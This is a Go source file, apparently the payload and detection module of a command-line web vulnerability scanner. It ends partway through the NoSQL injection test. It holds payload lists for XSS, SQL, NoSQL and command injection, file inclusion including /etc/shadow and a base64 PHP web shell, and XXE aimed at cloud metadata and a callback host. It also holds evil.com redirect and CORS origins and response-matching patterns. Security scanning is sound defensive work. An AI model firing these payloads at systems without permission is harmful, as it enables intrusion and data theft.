package vuln

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"
)

// VulnType represents vulnerability type
type VulnType string

const (
	VulnXSS        VulnType = "XSS"
	VulnSQLi       VulnType = "SQLi"
	VulnLFI        VulnType = "LFI"
	VulnRFI        VulnType = "RFI"
	VulnSSRF       VulnType = "SSRF"
	VulnCmdInj     VulnType = "Command Injection"
	VulnHeaders    VulnType = "Security Headers"
	VulnOpen       VulnType = "Open Redirect"
	VulnCORS       VulnType = "CORS Misconfiguration"
	VulnNoSQLi     VulnType = "NoSQL Injection"
	VulnXXE        VulnType = "XXE"
	VulnGraphQL    VulnType = "GraphQL Security"
	VulnHostHeader VulnType = "Host Header Injection"
	VulnRace       VulnType = "Race Condition"
)

// Severity levels
type Severity string

const (
	SeverityCritical Severity = "CRITICAL"
	SeverityHigh     Severity = "HIGH"
	SeverityMedium   Severity = "MEDIUM"
	SeverityLow      Severity = "LOW"
	SeverityInfo     Severity = "INFO"
)

// VulnResult represents a vulnerability finding
type VulnResult struct {
	Type        VulnType
	Severity    Severity
	URL         string
	Parameter   string
	Payload     string
	Evidence    string
	Description string
	Remediation string
}

// ScanOptions holds scanning configuration
type ScanOptions struct {
	URL          string
	Method       string
	Headers      map[string]string
	Cookie       string
	UserAgent    string
	Timeout      int
	Threads      int
	Insecure     bool
	FollowRedir  bool
	Verbose      bool
	PayloadLevel int // 1=basic, 2=normal, 3=aggressive
}

// XSS Payloads
var XSSPayloads = map[int][]string{
	1: { // Basic
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"'\"><script>alert(1)</script>",
	},
	2: { // Normal
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"'\"><script>alert(1)</script>",
		"<body onload=alert(1)>",
		"<iframe src=\"javascript:alert(1)\">",
		"<input onfocus=alert(1) autofocus>",
		"<marquee onstart=alert(1)>",
		"<details open ontoggle=alert(1)>",
		"<audio src=x onerror=alert(1)>",
		"javascript:alert(1)",
		"<img src=\"x\" onerror=\"alert(1)\">",
		"'-alert(1)-'",
		"\"-alert(1)-\"",
	},
	3: { // Aggressive
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"'\"><script>alert(1)</script>",
		"<body onload=alert(1)>",
		"<iframe src=\"javascript:alert(1)\">",
		"<input onfocus=alert(1) autofocus>",
		"<marquee onstart=alert(1)>",
		"<details open ontoggle=alert(1)>",
		"<audio src=x onerror=alert(1)>",
		"javascript:alert(1)",
		"<img src=\"x\" onerror=\"alert(1)\">",
		"'-alert(1)-'",
		"\"-alert(1)-\"",
		"<ScRiPt>alert(1)</ScRiPt>",
		"<scr<script>ipt>alert(1)</scr</script>ipt>",
		"<img/src=x onerror=alert(1)>",
		"<svg/onload=alert(1)>",
		"<<script>script>alert(1)<</script>/script>",
		"<script>alert(String.fromCharCode(88,83,83))</script>",
		"<img src=x:alert(alt) onerror=eval(src) alt=1>",
		"<svg><script>alert(1)</script></svg>",
		"%3Cscript%3Ealert(1)%3C/script%3E",
		"&#60;script&#62;alert(1)&#60;/script&#62;",
		"<script>eval(atob('YWxlcnQoMSk='))</script>",
	},
}

// SQLi Payloads
var SQLiPayloads = map[int][]string{
	1: { // Basic
		"'",
		"\"",
		"' OR '1'='1",
		"\" OR \"1\"=\"1",
		"1 OR 1=1",
	},
	2: { // Normal
		"'",
		"\"",
		"' OR '1'='1",
		"\" OR \"1\"=\"1",
		"1 OR 1=1",
		"' OR '1'='1' --",
		"' OR '1'='1' #",
		"') OR ('1'='1",
		"1' ORDER BY 1--",
		"1' ORDER BY 10--",
		"1 UNION SELECT NULL--",
		"1' AND '1'='1",
		"1' AND SLEEP(5)--",
		"1' WAITFOR DELAY '0:0:5'--",
		"1; SELECT * FROM users--",
	},
	3: { // Aggressive
		"'",
		"\"",
		"' OR '1'='1",
		"\" OR \"1\"=\"1",
		"1 OR 1=1",
		"' OR '1'='1' --",
		"' OR '1'='1' #",
		"') OR ('1'='1",
		"1' ORDER BY 1--",
		"1' ORDER BY 10--",
		"1 UNION SELECT NULL--",
		"1' AND '1'='1",
		"1' AND SLEEP(5)--",
		"1' WAITFOR DELAY '0:0:5'--",
		"1; SELECT * FROM users--",
		"admin'--",
		"' UNION SELECT 1,2,3--",
		"' UNION SELECT NULL,NULL,NULL--",
		"1' AND 1=1 UNION SELECT 1,2,3--",
		"' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
		"' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
		"1;EXEC xp_cmdshell('dir')--",
		"1' AND BENCHMARK(5000000,MD5('test'))--",
		"' OR ''='",
		"' OR 1=1 LIMIT 1--",
		"') UNION SELECT * FROM users WHERE ('1'='1",
		"0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z",
	},
}

// LFI Payloads
var LFIPayloads = map[int][]string{
	1: { // Basic
		"../../../etc/passwd",
		"..\\..\\..\\windows\\win.ini",
		"/etc/passwd",
	},
	2: { // Normal
		"../../../etc/passwd",
		"..\\..\\..\\windows\\win.ini",
		"/etc/passwd",
		"....//....//....//etc/passwd",
		"..%2F..%2F..%2Fetc%2Fpasswd",
		"..%252f..%252f..%252fetc%252fpasswd",
		"/etc/passwd%00",
		"php://filter/convert.base64-encode/resource=/etc/passwd",
		"php://input",
		"file:///etc/passwd",
	},
	3: { // Aggressive
		"../../../etc/passwd",
		"..\\..\\..\\windows\\win.ini",
		"/etc/passwd",
		"....//....//....//etc/passwd",
		"..%2F..%2F..%2Fetc%2Fpasswd",
		"..%252f..%252f..%252fetc%252fpasswd",
		"/etc/passwd%00",
		"php://filter/convert.base64-encode/resource=/etc/passwd",
		"php://input",
		"file:///etc/passwd",
		"/var/log/apache2/access.log",
		"/var/log/nginx/access.log",
		"/proc/self/environ",
		"expect://id",
		"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
		"..%c0%af..%c0%af..%c0%afetc/passwd",
		"..%255c..%255c..%255cetc/passwd",
		"/etc/shadow",
		"/etc/hosts",
		"/etc/apache2/apache2.conf",
		"/etc/nginx/nginx.conf",
		"/var/www/html/config.php",
		"php://filter/read=convert.base64-encode/resource=index.php",
	},
}

// Command Injection Payloads
var CmdInjPayloads = map[int][]string{
	1: { // Basic
		"; id",
		"| id",
		"&& id",
	},
	2: { // Normal
		"; id",
		"| id",
		"&& id",
		"|| id",
		"`id`",
		"$(id)",
		"; ls -la",
		"| cat /etc/passwd",
		"; whoami",
		"& ping -c 5 127.0.0.1 &",
	},
	3: { // Aggressive
		"; id",
		"| id",
		"&& id",
		"|| id",
		"`id`",
		"$(id)",
		"; ls -la",
		"| cat /etc/passwd",
		"; whoami",
		"& ping -c 5 127.0.0.1 &",
		"\n/bin/cat /etc/passwd",
		"a]); system('id');//",
		"| type c:\\windows\\win.ini",
		"& dir c:\\ &",
		"; sleep 5",
		"| sleep 5",
		"%0aid",
		"';id;'",
		"\"|id;\"",
	},
}

// Open Redirect Payloads
var OpenRedirectPayloads = []string{
	"//evil.com",
	"https://evil.com",
	"/\\evil.com",
	"////evil.com",
	"https:evil.com",
	"//evil.com/%2f..",
	"///evil.com",
	"////evil.com/",
	"https://evil.com/redirect",
	"//evil%E3%80%82com",
}

// NoSQLi Payloads - MongoDB focused
var NoSQLiPayloads = map[int][]string{
	1: { // Basic
		`{"$ne": ""}`,
		`{"$gt": ""}`,
		`[$ne]=1`,
	},
	2: { // Normal
		`{"$ne": ""}`,
		`{"$gt": ""}`,
		`{"$ne": null}`,
		`{"$exists": true}`,
		`{"$regex": ".*"}`,
		`[$ne]=1`,
		`[$gt]=`,
		`[$exists]=true`,
		`{"$or": [{}]}`,
		`{"$and": [{}]}`,
	},
	3: { // Aggressive
		`{"$ne": ""}`,
		`{"$gt": ""}`,
		`{"$ne": null}`,
		`{"$exists": true}`,
		`{"$regex": ".*"}`,
		`{"$regex": "^a"}`,
		`{"$where": "1==1"}`,
		`{"$where": "sleep(5000)"}`,
		`[$ne]=1`,
		`[$gt]=`,
		`[$exists]=true`,
		`[$regex]=.*`,
		`[$where]=1==1`,
		`{"$or": [{}]}`,
		`{"$and": [{}]}`,
		`{"$nin": []}`,
		`{"$in": []}`,
		`||1==1`,
		`'||'1'=='1`,
		`admin' || '1'=='1`,
	},
}

// XXE Payloads
var XXEPayloads = []string{
	// Basic file disclosure
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>`,

	// OOB XXE
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://CALLBACK/xxe">]><foo>&xxe;</foo>`,

	// Parameter entity
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://CALLBACK/xxe.dtd">%xxe;]><foo>test</foo>`,

	// Error-based XXE
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]><foo>&xxe;</foo>`,

	// PHP wrapper
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>`,

	// Expect wrapper
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>`,

	// SSRF via XXE
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>`,
}

// GraphQL introspection queries
var GraphQLQueries = map[string]string{
	"introspection_full":   `{"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}`,
	"introspection_simple": `{"query":"{__schema{types{name fields{name}}}}"}`,
	"type_query":           `{"query":"{__type(name:\"User\"){fields{name type{name}}}}"}`,
	"query_type":           `{"query":"{__schema{queryType{fields{name}}}}"}`,
	"mutation_type":        `{"query":"{__schema{mutationType{fields{name}}}}"}`,
}

// GraphQL DoS queries (nested)
var GraphQLDoSQueries = []string{
	`{"query":"query{__typename ".repeat(100)+"}"}`, // Placeholder for actual nested query
	`{"query":"{a]}}"}`,                             // Field suggestion exploitation
}

// Host Header attack payloads
var HostHeaderPayloads = []struct {
	Header string
	Value  string
	Desc   string
}{
	{"Host", "evil.com", "Basic host header override"},
	{"Host", "localhost", "Localhost bypass"},
	{"Host", "127.0.0.1", "Loopback bypass"},
	{"X-Forwarded-Host", "evil.com", "X-Forwarded-Host injection"},
	{"X-Host", "evil.com", "X-Host injection"},
	{"X-Forwarded-Server", "evil.com", "X-Forwarded-Server injection"},
	{"X-Original-URL", "/admin", "X-Original-URL injection"},
	{"X-Rewrite-URL", "/admin", "X-Rewrite-URL injection"},
	{"Host", "target.com:evil.com", "Port-based host injection"},
	{"Host", "target.com@evil.com", "User-based host injection"},
	{"Host", "evil.com#target.com", "Fragment-based injection"},
	{"Host", "target.com\r\nX-Injected: header", "CRLF in host"},
}

// CORS test origins
var CORSTestOrigins = []string{
	"null",
	"https://evil.com",
	"https://attacker.com",
	"https://TARGETDOMAIN.evil.com",     // Subdomain of attacker
	"https://TARGETDOMAINevil.com",      // Prefix match bypass
	"https://evil.TARGETDOMAIN",         // Suffix match bypass
	"https://eviltargetdomain.com",      // Contains match bypass
	"https://TARGETDOMAIN.com.evil.com", // Domain in subdomain
}

// SQL error patterns
var SQLErrorPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)SQL syntax.*MySQL`),
	regexp.MustCompile(`(?i)Warning.*mysql_`),
	regexp.MustCompile(`(?i)valid MySQL result`),
	regexp.MustCompile(`(?i)MySqlClient\.`),
	regexp.MustCompile(`(?i)PostgreSQL.*ERROR`),
	regexp.MustCompile(`(?i)Warning.*pg_`),
	regexp.MustCompile(`(?i)valid PostgreSQL result`),
	regexp.MustCompile(`(?i)Npgsql\.`),
	regexp.MustCompile(`(?i)Driver.* SQL[\-\_\ ]*Server`),
	regexp.MustCompile(`(?i)OLE DB.* SQL Server`),
	regexp.MustCompile(`(?i)SQLServer JDBC Driver`),
	regexp.MustCompile(`(?i)Microsoft SQL Native Client error`),
	regexp.MustCompile(`(?i)ODBC SQL Server Driver`),
	regexp.MustCompile(`(?i)SQLSrv`),
	regexp.MustCompile(`(?i)ORA-[0-9][0-9][0-9][0-9]`),
	regexp.MustCompile(`(?i)Oracle error`),
	regexp.MustCompile(`(?i)Oracle.*Driver`),
	regexp.MustCompile(`(?i)Warning.*oci_`),
	regexp.MustCompile(`(?i)Warning.*ora_`),
	regexp.MustCompile(`(?i)CLI Driver.*DB2`),
	regexp.MustCompile(`(?i)DB2 SQL error`),
	regexp.MustCompile(`(?i)SQLite/JDBCDriver`),
	regexp.MustCompile(`(?i)SQLite.Exception`),
	regexp.MustCompile(`(?i)System.Data.SQLite`),
	regexp.MustCompile(`(?i)Warning.*sqlite_`),
	regexp.MustCompile(`(?i)Warning.*SQLite3::`),
	regexp.MustCompile(`(?i)SQLITE_ERROR`),
	regexp.MustCompile(`(?i)SQL error.*POS([0-9]+)`),
	regexp.MustCompile(`(?i)Unclosed quotation mark`),
	regexp.MustCompile(`(?i)syntax error at or near`),
	regexp.MustCompile(`(?i)You have an error in your SQL`),
}

// LFI success patterns
var LFISuccessPatterns = []*regexp.Regexp{
	regexp.MustCompile(`root:.*:0:0:`),             // /etc/passwd
	regexp.MustCompile(`\[extensions\]`),           // win.ini
	regexp.MustCompile(`; for 16-bit app support`), // win.ini
	regexp.MustCompile(`\[boot loader\]`),          // boot.ini
	regexp.MustCompile(`HTTP_USER_AGENT`),          // /proc/self/environ
	regexp.MustCompile(`DOCUMENT_ROOT`),            // /proc/self/environ
	regexp.MustCompile(`<?php`),                    // PHP source
	regexp.MustCompile(`<\?=`),                     // PHP short tag
	regexp.MustCompile(`PD9waHA`),                  // base64 encoded <?php
	regexp.MustCompile(`DocumentRoot`),             // Apache config
	regexp.MustCompile(`server_name`),              // Nginx config
}

// TestXSS tests for XSS vulnerabilities
func TestXSS(opts ScanOptions, resultChan chan<- VulnResult) {
	payloads := XSSPayloads[opts.PayloadLevel]
	if payloads == nil {
		payloads = XSSPayloads[2]
	}

	client := createClient(opts)
	parsedURL, err := url.Parse(opts.URL)
	if err != nil {
		return
	}

	params := parsedURL.Query()
	sem := make(chan struct{}, opts.Threads)
	var wg sync.WaitGroup

	for param := range params {
		for _, payload := range payloads {
			wg.Add(1)
			sem <- struct{}{}

			go func(p, pay string) {
				defer wg.Done()
				defer func() { <-sem }()

				testURL := buildTestURL(parsedURL, p, pay)
				resp, body, err := doRequest(client, testURL, opts)
				if err != nil {
					return
				}
				defer resp.Body.Close()

				// Check if payload is reflected
				if strings.Contains(body, pay) || strings.Contains(body, strings.ReplaceAll(pay, "\"", "&quot;")) {
					resultChan <- VulnResult{
						Type:        VulnXSS,
						Severity:    SeverityHigh,
						URL:         testURL,
						Parameter:   p,
						Payload:     pay,
						Evidence:    "Payload reflected in response",
						Description: "Cross-Site Scripting (XSS) vulnerability detected. User input is reflected in the response without proper encoding.",
						Remediation: "Implement proper output encoding. Use Content-Security-Policy headers. Validate and sanitize user input.",
					}
				}
			}(param, payload)
		}
	}

	wg.Wait()
}

// TestSQLi tests for SQL injection vulnerabilities
func TestSQLi(opts ScanOptions, resultChan chan<- VulnResult) {
	payloads := SQLiPayloads[opts.PayloadLevel]
	if payloads == nil {
		payloads = SQLiPayloads[2]
	}

	client := createClient(opts)
	parsedURL, err := url.Parse(opts.URL)
	if err != nil {
		return
	}

	params := parsedURL.Query()
	sem := make(chan struct{}, opts.Threads)
	var wg sync.WaitGroup

	// Get baseline response
	baseResp, baseBody, err := doRequest(client, opts.URL, opts)
	if err != nil {
		return
	}
	baseResp.Body.Close()
	baseLen := len(baseBody)

	for param := range params {
		for _, payload := range payloads {
			wg.Add(1)
			sem <- struct{}{}

			go func(p, pay string) {
				defer wg.Done()
				defer func() { <-sem }()

				testURL := buildTestURL(parsedURL, p, pay)
				start := time.Now()
				resp, body, err := doRequest(client, testURL, opts)
				elapsed := time.Since(start)
				if err != nil {
					return
				}
				defer resp.Body.Close()

				// Check for SQL errors
				for _, pattern := range SQLErrorPatterns {
					if pattern.MatchString(body) {
						resultChan <- VulnResult{
							Type:        VulnSQLi,
							Severity:    SeverityCritical,
							URL:         testURL,
							Parameter:   p,
							Payload:     pay,
							Evidence:    fmt.Sprintf("SQL error detected: %s", pattern.String()),
							Description: "Error-based SQL Injection vulnerability detected. The application reveals SQL errors in responses.",
							Remediation: "Use parameterized queries. Implement proper error handling. Never expose database errors.",
						}
						return
					}
				}

				// Check for time-based injection
				if strings.Contains(pay, "SLEEP") || strings.Contains(pay, "WAITFOR") || strings.Contains(pay, "BENCHMARK") {
					if elapsed > 4*time.Second {
						resultChan <- VulnResult{
							Type:        VulnSQLi,
							Severity:    SeverityCritical,
							URL:         testURL,
							Parameter:   p,
							Payload:     pay,
							Evidence:    fmt.Sprintf("Response delayed: %v", elapsed),
							Description: "Time-based blind SQL Injection vulnerability detected. The application response time indicates SQL execution.",
							Remediation: "Use parameterized queries. Implement proper input validation.",
						}
						return
					}
				}

				// Check for content-based differences (boolean-based)
				if strings.Contains(pay, "OR") && strings.Contains(pay, "=") {
					lenDiff := len(body) - baseLen
					if lenDiff > 100 || lenDiff < -100 {
						resultChan <- VulnResult{
							Type:        VulnSQLi,
							Severity:    SeverityHigh,
							URL:         testURL,
							Parameter:   p,
							Payload:     pay,
							Evidence:    fmt.Sprintf("Content length difference: %d bytes", lenDiff),
							Description: "Potential boolean-based SQL Injection detected. Response content varies significantly with injection payload.",
							Remediation: "Use parameterized queries. Validate input strictly.",
						}
					}
				}
			}(param, payload)
		}
	}

	wg.Wait()
}

// TestLFI tests for Local File Inclusion vulnerabilities
func TestLFI(opts ScanOptions, resultChan chan<- VulnResult) {
	payloads := LFIPayloads[opts.PayloadLevel]
	if payloads == nil {
		payloads = LFIPayloads[2]
	}

	client := createClient(opts)
	parsedURL, err := url.Parse(opts.URL)
	if err != nil {
		return
	}

	params := parsedURL.Query()
	sem := make(chan struct{}, opts.Threads)
	var wg sync.WaitGroup

	for param := range params {
		for _, payload := range payloads {
			wg.Add(1)
			sem <- struct{}{}

			go func(p, pay string) {
				defer wg.Done()
				defer func() { <-sem }()

				testURL := buildTestURL(parsedURL, p, pay)
				resp, body, err := doRequest(client, testURL, opts)
				if err != nil {
					return
				}
				defer resp.Body.Close()

				// Check for LFI success patterns
				for _, pattern := range LFISuccessPatterns {
					if pattern.MatchString(body) {
						resultChan <- VulnResult{
							Type:        VulnLFI,
							Severity:    SeverityCritical,
							URL:         testURL,
							Parameter:   p,
							Payload:     pay,
							Evidence:    fmt.Sprintf("Pattern matched: %s", pattern.String()),
							Description: "Local File Inclusion vulnerability detected. The application allows reading arbitrary files from the server.",
							Remediation: "Validate file paths strictly. Use allowlists for permitted files. Disable dangerous PHP wrappers.",
						}
						return
					}
				}
			}(param, payload)
		}
	}

	wg.Wait()
}

// TestCommandInjection tests for command injection vulnerabilities
func TestCommandInjection(opts ScanOptions, resultChan chan<- VulnResult) {
	payloads := CmdInjPayloads[opts.PayloadLevel]
	if payloads == nil {
		payloads = CmdInjPayloads[2]
	}

	client := createClient(opts)
	parsedURL, err := url.Parse(opts.URL)
	if err != nil {
		return
	}

	params := parsedURL.Query()
	sem := make(chan struct{}, opts.Threads)
	var wg sync.WaitGroup

	// Command output patterns
	cmdPatterns := []*regexp.Regexp{
		regexp.MustCompile(`uid=\d+.*gid=\d+`),             // id command
		regexp.MustCompile(`root:.*:0:0:`),                 // /etc/passwd
		regexp.MustCompile(`\[boot loader\]`),              // boot.ini
		regexp.MustCompile(`Directory of [A-Z]:\\`),        // dir command
		regexp.MustCompile(`total \d+`),                    // ls command
		regexp.MustCompile(`(root|www-data|apache|nginx)`), // whoami
	}

	for param := range params {
		for _, payload := range payloads {
			wg.Add(1)
			sem <- struct{}{}

			go func(p, pay string) {
				defer wg.Done()
				defer func() { <-sem }()

				testURL := buildTestURL(parsedURL, p, pay)
				start := time.Now()
				resp, body, err := doRequest(client, testURL, opts)
				elapsed := time.Since(start)
				if err != nil {
					return
				}
				defer resp.Body.Close()

				// Check for command output
				for _, pattern := range cmdPatterns {
					if pattern.MatchString(body) {
						resultChan <- VulnResult{
							Type:        VulnCmdInj,
							Severity:    SeverityCritical,
							URL:         testURL,
							Parameter:   p,
							Payload:     pay,
							Evidence:    fmt.Sprintf("Command output detected: %s", pattern.String()),
							Description: "Command Injection vulnerability detected. The application executes arbitrary system commands.",
							Remediation: "Never pass user input directly to system commands. Use allowlists for permitted commands. Implement strict input validation.",
						}
						return
					}
				}

				// Check for time-based injection (sleep)
				if strings.Contains(pay, "sleep") || strings.Contains(pay, "ping") {
					if elapsed > 4*time.Second {
						resultChan <- VulnResult{
							Type:        VulnCmdInj,
							Severity:    SeverityCritical,
							URL:         testURL,
							Parameter:   p,
							Payload:     pay,
							Evidence:    fmt.Sprintf("Response delayed: %v", elapsed),
							Description: "Time-based Command Injection vulnerability detected.",
							Remediation: "Never pass user input to system commands. Use parameterized APIs when possible.",
						}
					}
				}
			}(param, payload)
		}
	}

	wg.Wait()
}

// TestOpenRedirect tests for open redirect vulnerabilities
func TestOpenRedirect(opts ScanOptions, resultChan chan<- VulnResult) {
	client := createClient(opts)
	client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}

	parsedURL, err := url.Parse(opts.URL)
	if err != nil {
		return
	}

	params := parsedURL.Query()

	// Common redirect parameter names
	redirectParams := []string{"url", "redirect", "return", "next", "goto", "target", "dest", "destination", "rurl", "return_url", "continue"}

	for param := range params {
		// Check if this looks like a redirect parameter
		isRedirectParam := false
		for _, rp := range redirectParams {
			if strings.Contains(strings.ToLower(param), rp) {
				isRedirectParam = true
				break
			}
		}

		for _, payload := range OpenRedirectPayloads {
			testURL := buildTestURL(parsedURL, param, payload)
			resp, _, err := doRequest(client, testURL, opts)
			if err != nil {
				continue
			}

			location := resp.Header.Get("Location")
			if resp.StatusCode >= 300 && resp.StatusCode < 400 {
				if strings.Contains(location, "evil.com") {
					severity := SeverityMedium
					if isRedirectParam {
						severity = SeverityHigh
					}
					resultChan <- VulnResult{
						Type:        VulnOpen,
						Severity:    severity,
						URL:         testURL,
						Parameter:   param,
						Payload:     payload,
						Evidence:    fmt.Sprintf("Redirect to: %s", location),
						Description: "Open Redirect vulnerability detected. The application redirects to user-controlled URLs.",
						Remediation: "Validate redirect URLs against an allowlist. Use relative URLs when possible.",
					}
				}
			}
			resp.Body.Close()
		}
	}
}

// CORSOptions holds CORS testing configuration
type CORSOptions struct {
	ScanOptions
	TestOrigin string
	Full       bool
}

// CORSResult holds CORS test results
type CORSResult struct {
	VulnResult
	AllowOrigin      string
	AllowCredentials bool
	AllowMethods     string
	AllowHeaders     string
	ExposeHeaders    string
}

// TestCORS tests for CORS misconfiguration vulnerabilities
func TestCORS(opts CORSOptions, resultChan chan<- VulnResult) {
	client := createClient(opts.ScanOptions)

	origins := CORSTestOrigins
	if opts.TestOrigin != "" {
		origins = []string{opts.TestOrigin}
	}

	// Extract target domain for dynamic payloads
	parsedURL, err := url.Parse(opts.URL)
	if err != nil {
		return
	}
	targetDomain := parsedURL.Hostname()

	for _, origin := range origins {
		// Replace TARGETDOMAIN placeholder
		testOrigin := strings.ReplaceAll(origin, "TARGETDOMAIN", targetDomain)

		req, err := http.NewRequest("OPTIONS", opts.URL, nil)
		if err != nil {
			continue
		}

		req.Header.Set("Origin", testOrigin)
		req.Header.Set("Access-Control-Request-Method", "GET")

		if opts.UserAgent != "" {
			req.Header.Set("User-Agent", opts.UserAgent)
		} else {
			req.Header.Set("User-Agent", "RaxuisCLI-VulnScanner/1.0")
		}

		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		allowOrigin := resp.Header.Get("Access-Control-Allow-Origin")
		allowCreds := resp.Header.Get("Access-Control-Allow-Credentials")
		allowMethods := resp.Header.Get("Access-Control-Allow-Methods")
		resp.Body.Close()

		// Check for vulnerabilities
		if allowOrigin == "*" {
			severity := SeverityMedium
			desc := "CORS allows any origin (*). This may expose sensitive data to any website."
			if allowCreds == "true" {
				severity = SeverityCritical
				desc = "CORS allows any origin (*) WITH credentials. This is a critical misconfiguration."
			}
			resultChan <- VulnResult{
				Type:        VulnCORS,
				Severity:    severity,
				URL:         opts.URL,
				Parameter:   "Access-Control-Allow-Origin",
				Payload:     testOrigin,
				Evidence:    fmt.Sprintf("Allow-Origin: %s, Allow-Credentials: %s", allowOrigin, allowCreds),
				Description: desc,
				Remediation: "Implement a strict allowlist of trusted origins. Avoid using wildcard (*) with credentials.",
			}
		} else if allowOrigin == testOrigin {
			// Origin is reflected
			severity := SeverityHigh
			desc := fmt.Sprintf("CORS reflects the Origin header (%s) without validation.", testOrigin)
			if allowCreds == "true" {
				severity = SeverityCritical
				desc = fmt.Sprintf("CORS reflects Origin (%s) WITH credentials enabled. Sensitive data can be stolen.", testOrigin)
			}
			resultChan <- VulnResult{
				Type:        VulnCORS,
				Severity:    severity,
				URL:         opts.URL,
				Parameter:   "Access-Control-Allow-Origin",
				Payload:     testOrigin,
				Evidence:    fmt.Sprintf("Origin reflected: %s, Credentials: %s, Methods: %s", allowOrigin, allowCreds, allowMethods),
				Description: desc,
				Remediation: "Validate Origin against a strict allowlist. Do not reflect arbitrary origins.",
			}
		} else if testOrigin == "null" && allowOrigin == "null" {
			resultChan <- VulnResult{
				Type:        VulnCORS,
				Severity:    SeverityHigh,
				URL:         opts.URL,
				Parameter:   "Access-Control-Allow-Origin",
				Payload:     "null",
				Evidence:    fmt.Sprintf("Null origin accepted: %s", allowOrigin),
				Description: "CORS accepts 'null' origin. This can be exploited via sandboxed iframes or data: URIs.",
				Remediation: "Do not allow 'null' as a valid origin. Remove it from the allowlist.",
			}
		}
	}

	// Also test with a simple GET request if --full
	if opts.Full {
		for _, origin := range origins {
			testOrigin := strings.ReplaceAll(origin, "TARGETDOMAIN", targetDomain)

			req, err := http.NewRequest("GET", opts.URL, nil)
			if err != nil {
				continue
			}
			req.Header.Set("Origin", testOrigin)

			if opts.UserAgent != "" {
				req.Header.Set("User-Agent", opts.UserAgent)
			}

			resp, err := client.Do(req)
			if err != nil {
				continue
			}

			allowOrigin := resp.Header.Get("Access-Control-Allow-Origin")
			allowCreds := resp.Header.Get("Access-Control-Allow-Credentials")
			resp.Body.Close()

			if allowOrigin != "" && (allowOrigin == "*" || allowOrigin == testOrigin) {
				resultChan <- VulnResult{
					Type:        VulnCORS,
					Severity:    SeverityMedium,
					URL:         opts.URL,
					Parameter:   "GET Request CORS",
					Payload:     testOrigin,
					Evidence:    fmt.Sprintf("Allow-Origin: %s, Allow-Credentials: %s", allowOrigin, allowCreds),
					Description: "CORS headers present on GET request, not just preflight.",
					Remediation: "Review CORS configuration for all request types.",
				}
				break
			}
		}
	}
}

// NoSQLiOptions holds NoSQL injection testing configuration
type NoSQLiOptions struct {
	ScanOptions
	Data   string
	DBType string // mongodb, couchdb, etc.
	IsJSON bool
}

// TestNoSQLi tests for NoSQL injection vulnerabilities
func TestNoSQLi(opts NoSQLiOptions, resultChan chan<- VulnResult) {
	payloads := NoSQLiPayloads[opts.PayloadLevel]
	if payloads == nil {
		payloads = NoSQLiPayloads[2]
	}

	client := createClient(opts.ScanOptions)
	parsedURL, err := url.Parse(opts.URL)
	if err != nil {
		return
	}

	// Test URL parameters
	params := parsedURL.Query()
	for param := range params {
		for _, payload := range payloads {
			// Skip JSON payloads for URL params, use bracket notation
			if strings.HasPrefix(payload, "{") {
				continue
			}

			testURL := buildTestURL(parsedURL, param+payload, "1")
			start := time.Now()
			resp, body, err := doRequest(client, testURL, opts.ScanOptions)
			elapsed := time.Since(start)
			if err != nil {
				continue
			}
			resp.Body.Close()

			// Check for NoSQL-specific errors
			nosqlErrors := []string{
				"MongoError",
				"MongoDB",
				"$where",
				"BSON",
				"Mongoose",
				"CastError",
				"ObjectId",
				"BSONObj",
				"JsonParseException",
				"invalid operator",
				"unknown operator",
				"bad query",
			}

			for _, errPattern := range nosqlErrors {
				if strings.Contains(body, errPattern) {
					resultChan <- VulnResult{
						Type:        VulnNoSQLi,
						Severity:    SeverityHigh,
						URL:         testURL,
						Parameter:   param,
						Payload:     payload,
						Evidence:    fmt.Sprintf("NoSQL error detected: %s", errPattern),
						Description: "NoSQL Injection vulnerability detected. The application reveals NoSQL errors.",
						Remediation: "Use parameterized queries. Validate and sanitize all user input. Never use user input in query operators.",
					}
					break
				}
			}

			// Time-based detection for $where payloads
			if strings.Contains(payload, "sleep") && elapsed > 4*time.Second {
				resultChan <- VulnResult{
					Type:        VulnNoSQLi,
					Severity:    SeverityCritical,
					URL:         testURL,
					Parameter:   param,
					Payload:     payload,
					Evidence:    fmt.Sprintf("Response delayed: %v (time-based injection)", elapsed),
					Description: "Time-based NoSQL Injection detected via $where clause.",
